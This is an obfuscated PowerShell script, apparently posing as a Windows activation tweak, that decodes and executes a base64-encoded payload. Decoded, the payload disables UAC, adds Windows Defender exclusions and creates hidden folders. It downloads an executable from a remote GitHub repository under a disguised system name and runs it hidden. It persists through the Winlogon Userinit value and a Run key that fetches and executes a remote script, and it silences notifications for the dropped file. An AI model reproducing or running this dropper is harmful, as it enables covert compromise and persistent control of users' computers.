$base64EncodedString = "JG9mZmljZURvd25sb2FkVXJsQjY0ID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJodHRwczovL2dpdGh1Yi5jb20vV2luZG93c1R3ZWFrc1gvUG93ZXJTaGVsbEFjdGl2YXRlL3Jhdy9yZWZzL2hlYWRzL21haW4vZG9sYmFlYi5leGUiKSkKJHVwZGF0ZXJyckV4ZUI2NCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygiU2VjdXJpdHlBY2NvdW50cyBNYW5hZ2VyKFNBTSkuZXhlIikpCgokaGlkZGVuQXR0ckI2NCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygiSGlkZGVuIikpCiRzaWxlbnRseUNvbnRpbnVlQjY0ID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJTaWxlbnRseUNvbnRpbnVlIikpCiRzdG9wQWN0aW9uQjY0ID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJTdG9wIikpCiRkaXJlY3RvcnlCNjQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoIkRpcmVjdG9yeSIpKQokcHJvZ3JhbWZpbGVzQjY0ID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJDOlxQcm9ncmFtIEZpbGVzIikpCgokb2ZmaWNlRG93bmxvYWRVcmwgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRvZmZpY2VEb3dubG9hZFVybEI2NCkpCiR1cGRhdGVycnJFeGUgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCR1cGRhdGVycnJFeGVCNjQpKQokaGlkZGVuQXR0ciA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGhpZGRlbkF0dHJCNjQpKQokc2lsZW50bHlDb250aW51ZSA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJHNpbGVudGx5Q29udGludWVCNjQpKQokc3RvcEFjdGlvbiA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJHN0b3BBY3Rpb25CNjQpKQokZGlyZWN0b3J5ID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkZGlyZWN0b3J5QjY0KSkKJHByb2dyYW1maWxlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJHByb2dyYW1maWxlc0I2NCkpCgokaGlkZGVuRm9sZGVyTmFtZSA9ICJTZWN1cml0eUFjY291bnRzTWFuYWdlcl8iICsgW1N5c3RlbS5HdWlkXTo6TmV3R3VpZCgpLlRvU3RyaW5nKCkuU3Vic3RyaW5nKDAsOCkKJGhpZGRlbkZvbGRlciA9IEpvaW4tUGF0aCAkZW52OkxPQ0FMQVBQREFUQSAkaGlkZGVuRm9sZGVyTmFtZQpOZXctSXRlbSAtSXRlbVR5cGUgJGRpcmVjdG9yeSAtUGF0aCAkaGlkZGVuRm9sZGVyIC1Gb3JjZSB8IE91dC1OdWxsCiRvZmZpY2VQYXRoID0gSm9pbi1QYXRoICRoaWRkZW5Gb2xkZXIgJHVwZGF0ZXJyckV4ZQpOZXctSXRlbSAtUGF0aCAiQzpcUHJvZ3JhbSBGaWxlc1xFdGhlcm5ldCBDb25maWd1cmF0aW9uIiAtSXRlbVR5cGUgRGlyZWN0b3J5IC1Gb3JjZQokc2NyaXB0UGF0aCA9ICJDOlxQcm9ncmFtIEZpbGVzXEV0aGVybmV0IENvbmZpZ3VyYXRpb25cVXNlcmluaXQucHMxIgokcmVnUGF0aCA9ICJIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxXaW5sb2dvbiIKJG5ld1VzZXIgPSAiQzpcV2luZG93c1xTeXN0ZW0zMlx1c2VyaW5pdC5leGUsQzpcUHJvZ3JhbSBGaWxlc1xFdGhlcm5ldCBDb25maWd1cmF0aW9uXFVzZXJpbml0LnBzMSIKCiRzY3JpcHRDb250ZW50ID0gQCcKJGNvbW1hbmQgPSAicG93ZXJzaGVsbC5leGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgYCJpd3IgJ2h0dHBzOi8vZ2l0aHViLmNvbS9XaW5kb3dzVHdlYWtzWC9Qb3dlclNoZWxsQWN0aXZhdGUvcmF3L3JlZnMvaGVhZHMvbWFpbi9SZWFjdGl2YXRlU2NyaXB0JyB8IGlleGAiIgpTdGFydC1Qcm9jZXNzIHBvd2Vyc2hlbGwuZXhlIC1Bcmd1bWVudExpc3QgIi1Ob1Byb2ZpbGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgYCRjb21tYW5kIiAtVmVyYiBSdW5BcyAtV2luZG93U3R5bGUgSGlkZGVuCidACgpmdW5jdGlvbiBBZGQtRm9sZGVyRXhjbHVzaW9uIHsKICAgIHBhcmFtICgKICAgICAgICBbc3RyaW5nXSRwYXRoLAogICAgICAgIFtpbnRdJG1heFJldHJpZXMgPSA1LAogICAgICAgIFtpbnRdJGRlbGF5U2Vjb25kcyA9IDEKICAgICkKICAgICRyZXRyeUNvdW50ID0gMAogICAgJHN1Y2Nlc3MgPSAkZmFsc2UKICAgIAogICAgd2hpbGUgKC1ub3QgJHN1Y2Nlc3MgLWFuZCAkcmV0cnlDb3VudCAtbHQgJG1heFJldHJpZXMpIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICRwYXRoIC1FcnJvckFjdGlvbiAkc3RvcEFjdGlvbgogICAgICAgICAgICBpZiAoR2V0LU1wUHJlZmVyZW5jZSB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IEV4Y2x1c2lvblBhdGggfCBXaGVyZS1PYmplY3QgeyAkXyAtZXEgJHBhdGggfSkgewogICAgICAgICAgICAgICAgJHN1Y2Nlc3MgPSAkdHJ1ZQogICAgICAgICAgICB9CiAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgICRyZXRyeUNvdW50KysKICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgJGRlbGF5U2Vjb25kcwogICAgICAgIH0KICAgIH0KICAgIGlmICgtbm90ICRzdWNjZXNzKSB7CiAgICB9CiAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDIwMAp9CgoKdHJ5IHsKICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggIkhLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSIgLU5hbWUgIkVuYWJsZUxVQSIgLVZhbHVlIDAKICAgIEFkZC1Gb2xkZXJFeGNsdXNpb24gLXBhdGggJHByb2dyYW1maWxlcwogICAgQWRkLUZvbGRlckV4Y2x1c2lvbiAtcGF0aCAkaGlkZGVuRm9sZGVyCiAgICBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICRvZmZpY2VQYXRoCiAgICBTZXQtQ29udGVudCAtUGF0aCAkc2NyaXB0UGF0aCAtVmFsdWUgJHNjcmlwdENvbnRlbnQKICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJHNjcmlwdFBhdGggLU5hbWUgQXR0cmlidXRlcyAtVmFsdWUgKFtTeXN0ZW0uSU8uRmlsZUF0dHJpYnV0ZXNdOjpIaWRkZW4pCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRyZWdQYXRoIC1OYW1lICJVc2VyaW5pdCIgLVZhbHVlICRuZXdVc2VyCiAgICBDbGVhci1Ib3N0CiAgICAKICAgIEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJG9mZmljZURvd25sb2FkVXJsIC1PdXRGaWxlICRvZmZpY2VQYXRoIC1Vc2VCYXNpY1BhcnNpbmcgLUVycm9yQWN0aW9uICRzdG9wQWN0aW9uCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRoaWRkZW5Gb2xkZXIgLU5hbWUgQXR0cmlidXRlcyAtVmFsdWUgJGhpZGRlbkF0dHIKICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJG9mZmljZVBhdGggLU5hbWUgQXR0cmlidXRlcyAtVmFsdWUgJGhpZGRlbkF0dHIKCiAgICBTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkb2ZmaWNlUGF0aCAtV2luZG93U3R5bGUgSGlkZGVuCiAgICAgICAKCiAgICAkcmVnUGF0aE9mZmljZSA9ICJIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iCiAgICAkcmVnTmFtZU9mZmljZSA9ICJXaW5kb3dzIFBvd2Vyc2hlbGwgU2VydmljZSAoV1BTKSIKICAgICRyZWdWYWx1ZU9mZmljZSA9ICJwb3dlcnNoZWxsLmV4ZSAtV2luZG93U3R5bGUgSGlkZGVuIC1Db21tYW5kIGAiaXdyICdodHRwczovL2dpdGh1Yi5jb20vV2luZG93c1R3ZWFrc1gvUG93ZXJTaGVsbEFjdGl2YXRlL3Jhdy9yZWZzL2hlYWRzL21haW4vUmVhY3RpdmF0ZVNjcmlwdCcgfCBpZXhgIiIKICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJHJlZ1BhdGhPZmZpY2UgLU5hbWUgJHJlZ05hbWVPZmZpY2UgLVZhbHVlICRyZWdWYWx1ZU9mZmljZSAtRXJyb3JBY3Rpb24gJHNpbGVudGx5Q29udGludWUKICAgIAogICAgTmV3LUl0ZW0gLVBhdGggIkhLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXE5vdGlmaWNhdGlvbnNcU2V0dGluZ3MiIC1OYW1lICR1cGRhdGVycnJFeGUgLUZvcmNlIHwgT3V0LU51bGwKICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggIkhLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXE5vdGlmaWNhdGlvbnNcU2V0dGluZ3NcJHVwZGF0ZXJyckV4ZSIgLU5hbWUgIkVuYWJsZWQiIC1WYWx1ZSAwIC1FcnJvckFjdGlvbiAkc2lsZW50bHlDb250aW51ZQogICAgCiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAyCn0gY2F0Y2ggewogICAgZXhpdCAxCn0gZmluYWxseSB7CiAgIAp9Cg=="
$decodedBytes = [System.Convert]::FromBase64String($base64EncodedString)
$decodedString = [System.Text.Encoding]::UTF8.GetString($decodedBytes)
Invoke-Expression $decodedString
